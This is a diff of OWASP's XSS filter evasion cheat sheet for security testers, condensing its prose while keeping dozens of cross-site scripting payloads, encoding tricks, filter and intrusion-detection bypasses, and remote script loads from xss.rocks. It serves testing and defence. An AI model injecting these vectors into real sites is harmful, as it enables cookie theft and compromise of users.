@@ -2,42 +2,42 @@
 
 ## Introduction
 
-This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: `http://ha.ckers.org/xss.html`. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's work and we thank RSnake for the inspiration!
+Cross Site Scripting (XSS) testing guide for application security professionals. Originally based on RSnake's seminal XSS Cheat Sheet, previously at `http://ha.ckers.org/xss.html`; OWASP Cheat Sheet Series now maintains updated version. First OWASP Cheat Sheet, [Cross Site Scripting Prevention](Cross_Site_Scripting_Prevention.md), inspired by RSnake's work. Thanks RSnake.
 
 ## Tests
 
-This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.
+Shows input filtering = incomplete XSS defense; supplies XSS attacks bypassing certain XSS filters.
 
 ### Basic XSS Test Without Filter Evasion
 
-For this baseline test, host a script containing only `alert('XSS')` on an HTTPS endpoint you control. Replace the placeholder URL below with that script's URL:
+Baseline: host script containing only `alert('XSS')` on HTTPS endpoint you control. Replace placeholder URL below with script's URL:
 
 ```html
 <SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>
 ```
 
-Use a script you have reviewed and control: [external scripts execute in the context of the tested page](https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement/src#security_considerations). A mutable third-party script can change what runs during your test.
+Use script you reviewed and control: external scripts execute in context of tested page. Mutable third-party script can change what runs during test.
 
 ### XSS Locator (Polyglot)
 
-This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:
+'Polyglot test XSS payload' executes in multiple contexts: HTML, script strings, JavaScript, URLs:
 
 ```js
 javascript:/*--></title></style></textarea></script></xmp>
 <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
 ```
 
-(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).
+(Based on tweet by Gareth Heyes).
 
 ### Malformed A Tags
 
-This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:
+Skips `href` attribute to demonstrate XSS via event handlers:
 
 ```js
 \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
 ```
 
-Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:
+Chrome automatically inserts missing quotes. If issues, omit them; Chrome places missing quotes in URLs or scripts:
 
 ```js
 \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
@@ -47,17 +47,17 @@ Chrome automatically inserts missing quotes for you. If you encounter issues, tr
 
 ### Malformed IMG Tags
 
-This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:
+Uses relaxed rendering engine to create XSS vector within IMG tag (must be encapsulated in quotes). Probably originally meant to correct sloppy coding; also makes correct HTML tag parsing significantly harder:
 
 ```html
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
 ```
 
-(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)
+(Originally found by Begeek, cleaned up and shortened to work in all browsers)
 
 ### fromCharCode
 
-If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:
+System disallows quotes of any kind → `eval()` a `fromCharCode` in JavaScript to create any XSS vector:
 
 ```html
 <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
@@ -65,7 +65,7 @@ If the system does not allow quotes of any kind, you can `eval()` a `fromCharCod
 
 ### Default SRC Tag to Get Past Filters that Check SRC Domain
 
-This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:
+Bypasses most SRC domain filters. JavaScript in event handler also applies to any HTML tag type injection (Form, Iframe, Input, Embed, etc.). Any relevant event substitutable for tag type, e.g. `onblur` or `onclick`, giving extensive variations:
 
 ```html
 <IMG SRC=# onmouseover="alert('xxs')">
@@ -99,7 +99,7 @@ This attack will bypass most SRC domain filters. Inserting JavaScript in an even
 
 ### Decimal HTML Character References
 
-Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
+XSS examples using `javascript:` directive inside `<IMG` tag don't work on Firefox; workaround: decimal HTML character references:
 
 ```html
 
@@ -108,7 +108,7 @@ Since XSS examples that use a `javascript:` directive inside an `<IMG` tag do no
 
 ### Decimal HTML Character References Without Trailing Semicolons
 
-This is often effective in bypassing XSS filters that look for the string `&\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
+Often bypasses XSS filters looking for string `&\#XX;`; most don't know padding works up to 7 numeric characters total. Also useful against filters decoding with strings like `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;`, which wrongly assume semicolon required to terminate HTML encoded string (seen in the wild):
 
 ```html
 <a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
@@ -116,7 +116,7 @@ This is often effective in bypassing XSS filters that look for the string `&\#XX
 
 ### Hexadecimal HTML Character References Without Trailing Semicolons
 
-This attack is also viable against the filter for the string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
+Also works against filter for string `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;`, which assumes numeric character follows pound symbol; false for hex HTML characters:
 
 ```html
 <a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
@@ -127,9 +127,11 @@ This attack is also viable against the filter for the string `$tmp\_string=\~ s/
 This approach breaks up the XSS attack:
 
 <!-- markdownlint-disable MD010-->
+
 ```html
  <a href="jav	ascript:alert('XSS');">Click Me</a>
 ```
+
 <!-- markdownlint-enable MD010-->
 
 ### Embedded Encoded Tab
@@ -142,7 +144,7 @@ This approach can also break up XSS:
 
 ### Embedded Newline to Break Up XSS
 
-While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:
+Some defenders claim any of chars 09-13 (decimal) work; incorrect. Only 09 (horizontal tab), 10 (newline), 13 (carriage return) work. See ASCII table. Next four examples illustrate vector:
 
 ```html
 <a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
@@ -150,7 +152,7 @@ While some defenders claim that any of the chars 09-13 (decimal) will work for t
 
 #### Example 1: Break Up XSS Attack with Embedded Carriage Return
 
-(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
+(Note: strings above longer than needed; zeros could be omitted. Filters often assume hex and dec encoding must be two or three characters. Real rule: 1-7 characters.):
 
 ```html
 <a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
@@ -158,7 +160,7 @@ While some defenders claim that any of the chars 09-13 (decimal) will work for t
 
 #### Example 2: Break Up JavaScript Directive with Null
 
-Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:
+Null chars also work as XSS vectors, but must be injected directly, e.g. Burp Proxy, `%00` in URL string, vim (`^V^@` produces null), or own injection tool writing to text file using program below. Null char `%00` much more useful; helped bypass certain real world filters with variation on this example:
 
 ```sh
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
@@ -166,7 +168,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 
 #### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS
 
-This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:
+Useful if filter's pattern match ignores spaces in `javascript:` word (correct, won't render) but falsely assumes no space allowed between quote and `javascript:` keyword. Reality: any char 1-32 decimal allowed:
 
 ```html
 <a href=" &#14;  javascript:alert('XSS');">Click Me</a>
@@ -174,19 +176,19 @@ This is useful if a filter's pattern match doesn't take into account spaces in t
 
 #### Example 4: Non-alpha-non-digit XSS
 
-The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:
+Firefox HTML parser treats non-alpha-non-digit after HTML keyword as invalid, considers it whitespace or non-valid token after HTML tag. Some XSS filters assume tag they seek is broken by whitespace. E.g. `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`:
 
 ```html
 <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
 ```
 
-Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
+Same idea, expanded using Rsnake's fuzzer. Gecko rendering engine allows any character other than letters, numbers, encapsulation chars (quotes, angle brackets, etc) between event handler and equals sign, easing cross site scripting block bypass. Also applies to grave accent char:
 
 ```html
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 ```
 
-Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:
+Yair Amit: slight behavior difference between Trident (IE) and Gecko (Firefox) rendering engines allows just slash between tag and parameter, no spaces. Useful if system disallows spaces:
 
 ```html
 <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
@@ -194,7 +196,7 @@ Yair Amit noted that there is a slightly different behavior between the Trident 
 
 ### Extraneous Open Brackets
 
-This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:
+Could defeat detection engines that check matching pairs of open/close angle brackets then compare inside tag, instead of more efficient algorithm like Boyer-Moore looking for entire string matches of open angle bracket plus associated tag (post de-obfuscation). Double slash comments out ending extraneous bracket, suppressing JavaScript error:
 
 ```html
 <<SCRIPT>alert("XSS");//\<</SCRIPT>
@@ -204,7 +206,7 @@ This XSS vector could defeat certain detection engines that work by checking mat
 
 ### No Closing Script Tags
 
-With Firefox, you don't actually need the `\></SCRIPT>` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:
+Firefox: `\></SCRIPT>` portion unnecessary; Firefox assumes safe to close HTML tag, adds closing tags. Unlike next attack (doesn't affect Firefox), needs no additional HTML below. Quotes can be added if needed, normally unnecessary:
 
 ```html
 <SCRIPT SRC=http://xss.rocks/xss.js?< B >
@@ -212,7 +214,7 @@ With Firefox, you don't actually need the `\></SCRIPT>` portion of this XSS vect
 
 ### Protocol Resolution in Script Tags
 
-This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:
+Partially based on Ozh's protocol resolution bypass below; works in IE and Edge in compatibility mode. Especially useful where space is an issue; shorter domain better. `.j` valid regardless of encoding type because browser knows it in SCRIPT tag context:
 
 ```html
 <SCRIPT SRC=//xss.rocks/.j>
@@ -222,7 +224,7 @@ This particular variant is partially based on Ozh's protocol resolution bypass b
 
 ### Half Open HTML/JavaScript XSS Vector
 
-Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` because it doesn't require the end `\>`. As a side note, this was also affective against a real world XSS filter using an open ended `<IFRAME` tag instead of an `<IMG` tag.
+Unlike Firefox, IE rendering engine (Trident) adds no extra data to page, but allows `javascript:` directive in images. Useful vector since no close angle bracket needed. Assumes any HTML tag exists below injection point; tags below close it even without close `\>`. Note: messes up HTML depending on what's beneath. Bypasses network intrusion detection system (NIDS) regex `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` since no end `\>` needed. Also effective against real world XSS filter using open ended `<IFRAME` tag instead of `<IMG` tag.
 
 ```html
 <IMG SRC="`<javascript:alert>`('XSS')"
@@ -230,13 +232,13 @@ Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your
 
 ### Escaping JavaScript Escapes
 
-If an application is written to output some user information inside of a JavaScript (like the following: `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:
+App outputs user info inside JavaScript (e.g. `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`) but server-side escapes certain quotes → circumvent by escaping their escape character. Injected, reads `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`, un-escaping double quote and firing XSS vector. XSS locator uses this method:
 
 ```js
 \";alert('XSS');//
 ```
 
-An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:
+Alternative, if correct JSON or JavaScript escaping applied to embedded data but not HTML encoding: finish script block and start own:
 
 ```js
 </script><script>alert('XSS');</script>
@@ -244,7 +246,7 @@ An alternative, if correct JSON or JavaScript escaping has been applied to the e
 
 ### End Title Tag
 
-This is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate the malicious cross site scripting attack:
+Simple vector closing `<TITLE>` tags, which can encapsulate malicious XSS attack:
 
 ```html
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
@@ -276,7 +278,7 @@ This is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate th
 
 ### List-style-image
 
-This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:
+Esoteric attack embedding images for bulleted lists. Works only in IE rendering engine (JavaScript directive). Not particularly useful:
 
 ```html
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
@@ -302,7 +304,7 @@ Set.constructor`alert\x28document.domain\x29
 
 ### BODY Tag
 
-This attack doesn't require using any variants of `javascript:` or `<SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):
+Needs no variants of `javascript:` or `<SCRIPT...`. Dan Crowley: space allowed before equals sign (`onload=` != `onload =`):
 
 ```html
 <BODY ONLOAD=alert('XSS')>
@@ -310,113 +312,113 @@ This attack doesn't require using any variants of `javascript:` or `<SCRIPT...` 
 
 #### Attacks Using Event Handlers
 
-The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.
+BODY tag attack adaptable to similar XSS attacks (most comprehensive list on the net at time of writing). Thanks to Rene Ledosquet for HTML+TIME updates.
 
-The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).
+Dottoro Web Reference also has list of events in JavaScript.
 
-- `onAbort()` (when user aborts the loading of an image)
-- `onActivate()` (when object is set as the active element)
-- `onAfterPrint()` (activates after user prints or previews print job)
-- `onAfterUpdate()` (activates on data object after updating data in the source object)
-- `onBeforeActivate()` (fires before the object is set as the active element)
-- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
-- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
-- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
-- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
-- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
-- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
-- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
-- `onBeforeUpdate()` (activates on data object before updating data in the source object)
-- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
-- `onBlur()` (in the case where another popup is loaded and window looses focus)
-- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
-- `onCellChange()` (fires when data changes in the data provider)
-- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
-- `onClick()` (someone clicks on a form)
-- `onContextMenu()` (user would need to right click on attack area)
-- `onControlSelect()` (fires when the user is about to make a control selection of the object)
-- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
-- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
-- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
-- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
-- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
-- `onDblClick()` (user double-clicks a form element or a link)
-- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
-- `onDrag()` (requires that the user drags an object)
-- `onDragEnd()` (requires that the user drags an object)
-- `onDragLeave()` (requires that the user drags an object off a valid location)
-- `onDragEnter()` (requires that the user drags an object into a valid location)
-- `onDragOver()` (requires that the user drags an object into a valid location)
-- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
-- `onDragStart()` (occurs when user starts drag operation)
-- `onDrop()` (user drops an object (e.g. file) onto the browser window)
-- `onEnd()` (the onEnd event fires when the timeline ends.
-- `onError()` (loading of a document or image causes an error)
-- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
-- `onFilterChange()` (fires when a visual filter completes state change)
-- `onFinish()` (attacker can create the exploit when marquee is finished looping)
-- `onFocus()` (attacker executes the attack string when the window gets focus)
-- `onFocusIn()` (attacker executes the attack string when window gets focus)
-- `onFocusOut()` (attacker executes the attack string when window looses focus)
-- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
-- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
-- `onInput()` (the text content of an element is changed through the user interface)
-- `onKeyDown()` (user depresses a key)
-- `onKeyPress()` (user presses or holds down a key)
-- `onKeyUp()` (user releases a key)
-- `onLayoutComplete()` (user would have to print or print preview)
-- `onLoad()` (attacker executes the attack string after the window loads)
-- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
-- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
-- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
-- `onMessage()` (fire when the document received a message)
-- `onMouseDown()` (the attacker would need to get the user to click on an image)
-- `onMouseEnter()` (cursor moves over an object or area)
-- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
-- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
-- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
-- `onMouseOver()` (cursor moves over an object or area)
-- `onMouseUp()` (the attacker would need to get the user to click on an image)
-- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
-- `onMove()` (user or attacker would move the page)
-- `onMoveEnd()` (user or attacker would move the page)
-- `onMoveStart()` (user or attacker would move the page)
-- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
-- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
-- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
-- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
-- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
-- `onPopState()` (fires when user navigated the session history)
-- `onPropertyChange()` (user or attacker would need to change an element property)
-- `onReadyStateChange()` (user or attacker would need to change an element property)
+- `onAbort()` (user aborts image loading)
+- `onActivate()` (object set as active element)
+- `onAfterPrint()` (after user prints or previews print job)
+- `onAfterUpdate()` (on data object after updating data in source object)
+- `onBeforeActivate()` (before object set as active element)
+- `onBeforeCopy()` (attacker executes attack string right before selection copied to clipboard; attackers can use `execCommand("Copy")` function)
+- `onBeforeCut()` (attacker executes attack string right before selection cut)
+- `onBeforeDeactivate()` (right after activeElement changed from current object)
+- `onBeforeEditFocus()` (before object in editable element enters UI-activated state, or editable container object control selected)
+- `onBeforePaste()` (user tricked into pasting, or forced via `execCommand("Paste")` function)
+- `onBeforePrint()` (user tricked into printing, or attacker uses `print()` or `execCommand("Print")` function).
+- `onBeforeUnload()` (user tricked into closing browser; attacker cannot unload windows unless spawned from parent)
+- `onBeforeUpdate()` (on data object before updating data in source object)
+- `onBegin()` (onbegin fires immediately when element's timeline begins)
+- `onBlur()` (another popup loaded, window loses focus)
+- `onBounce()` (marquee behavior property set to "alternate" and contents reach one side of window)
+- `onCellChange()` (data changes in data provider)
+- `onChange()` (select, text, or TEXTAREA field loses focus, value modified)
+- `onClick()` (someone clicks on form)
+- `onContextMenu()` (user right clicks attack area)
+- `onControlSelect()` (user about to make control selection of object)
+- `onCopy()` (user copies something, or exploited via `execCommand("Copy")` command)
+- `onCut()` (user copies something, or exploited via `execCommand("Cut")` command)
+- `onDataAvailable()` (user changes data in element, or attacker does same)
+- `onDataSetChanged()` (data set exposed by data source object changes)
+- `onDataSetComplete()` (all data available from data source object)
+- `onDblClick()` (user double-clicks form element or link)
+- `onDeactivate()` (activeElement changed from current object to another object in parent document)
+- `onDrag()` (user drags object)
+- `onDragEnd()` (user drags object)
+- `onDragLeave()` (user drags object off valid location)
+- `onDragEnter()` (user drags object into valid location)
+- `onDragOver()` (user drags object into valid location)
+- `onDragDrop()` (user drops object (e.g. file) onto browser window)
+- `onDragStart()` (user starts drag operation)
+- `onDrop()` (user drops object (e.g. file) onto browser window)
+- `onEnd()` (onEnd fires when timeline ends.
+- `onError()` (loading document or image causes error)
+- `onErrorUpdate()` (on data bound object when error occurs updating associated data in data source object)
+- `onFilterChange()` (visual filter completes state change)
+- `onFinish()` (attacker creates exploit when marquee finished looping)
+- `onFocus()` (attacker executes attack string when window gets focus)
+- `onFocusIn()` (attacker executes attack string when window gets focus)
+- `onFocusOut()` (attacker executes attack string when window loses focus)
+- `onHashChange()` (fragment identifier part of document's current address changed)
+- `onHelp()` (attacker executes attack string when user hits F1 with window in focus)
+- `onInput()` (element text content changed through user interface)
+- `onKeyDown()` (user depresses key)
+- `onKeyPress()` (user presses or holds key)
+- `onKeyUp()` (user releases key)
+- `onLayoutComplete()` (user must print or print preview)
+- `onLoad()` (attacker executes attack string after window loads)
+- `onLoseCapture()` (exploitable by `releaseCapture()` method)
+- `onMediaComplete()` (streaming media file used; event could fire before file starts playing)
+- `onMediaError()` (user opens page with media file; event fires on problem)
+- `onMessage()` (document received message)
+- `onMouseDown()` (attacker needs user to click image)
+- `onMouseEnter()` (cursor moves over object or area)
+- `onMouseLeave()` (attacker needs user to mouse over image or table and off again)
+- `onMouseMove()` (attacker needs user to mouse over image or table)
+- `onMouseOut()` (attacker needs user to mouse over image or table and off again)
+- `onMouseOver()` (cursor moves over object or area)
+- `onMouseUp()` (attacker needs user to click image)
+- `onMouseWheel()` (attacker needs user to use mouse wheel)
+- `onMove()` (user or attacker moves page)
+- `onMoveEnd()` (user or attacker moves page)
+- `onMoveStart()` (user or attacker moves page)
+- `onOffline()` (browser in online mode starts working offline)
+- `onOnline()` (browser in offline mode starts working online)
+- `onOutOfSync()` (interrupt element's ability to play media as defined by timeline)
+- `onPaste()` (user pastes, or attacker uses `execCommand("Paste")` function)
+- `onPause()` (onpause fires on every element active when timeline pauses, incl. body element)
+- `onPopState()` (user navigated session history)
+- `onPropertyChange()` (user or attacker changes element property)
+- `onReadyStateChange()` (user or attacker changes element property)
 - `onRedo()` (user went forward in undo transaction history)
-- `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
-- `onReset()` (user or attacker resets a form)
-- `onResize()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
-- `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
-- `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
-- `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
-- `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
-- `onRowsEnter()` (user or attacker would need to change a row in a data source)
-- `onRowExit()` (user or attacker would need to change a row in a data source)
-- `onRowDelete()` (user or attacker would need to delete a row in a data source)
-- `onRowInserted()` (user or attacker would need to insert a row in a data source)
-- `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
-- `onSeek()` (the `onReverse` event fires when the timeline is set to play in any direction other than forward)
-- `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
-- `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
-- `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
-- `onStart()` (fires at the beginning of each marquee loop)
-- `onStop()` (user would need to press the stop button or leave the webpage)
+- `onRepeat()` (fires once per timeline repetition, excluding first full cycle)
+- `onReset()` (user or attacker resets form)
+- `onResize()` (user resizes window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
+- `onResizeEnd()` (user resizes window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
+- `onResizeStart()` (user resizes window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
+- `onResume()` (onresume fires on every element becoming active when timeline resumes, incl. body element)
+- `onReverse()` (element has repeatCount greater than one; fires every time timeline begins playing backward)
+- `onRowsEnter()` (user or attacker changes row in data source)
+- `onRowExit()` (user or attacker changes row in data source)
+- `onRowDelete()` (user or attacker deletes row in data source)
+- `onRowInserted()` (user or attacker inserts row in data source)
+- `onScroll()` (user scrolls, or attacker uses `scrollBy()` function)
+- `onSeek()` (`onReverse` event fires when timeline set to play in any direction other than forward)
+- `onSelect()` (user selects text; attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+- `onSelectionChange()` (user selects text; attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+- `onSelectStart()` (user selects text; attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
+- `onStart()` (beginning of each marquee loop)
+- `onStop()` (user presses stop button or leaves webpage)
 - `onStorage()` (storage area changed)
-- `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
-- `onSubmit()` (requires attacker or user submits a form)
-- `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
-- `onTrackChange()` (user or attacker changes track in a playList)
+- `onSyncRestored()` (user interrupts element's ability to play media as defined by timeline to fire)
+- `onSubmit()` (attacker or user submits form)
+- `onTimeError()` (user or attacker sets time property, such as dur, to invalid value)
+- `onTrackChange()` (user or attacker changes track in playList)
 - `onUndo()` (user went backward in undo transaction history)
-- `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
-- `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
-- `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
+- `onUnload()` (user clicks any link or presses back button, or attacker forces click)
+- `onURLFlip()` (fires when Advanced Streaming Format (ASF) file, played by HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in ASF file)
+- `seekSegmentTime()` (method locating specified point on element's segment time line, begins playing from that point. Segment = one repetition of time line incl. reverse play using AUTOREVERSE attribute.)
 
 #### BGSOUND
 
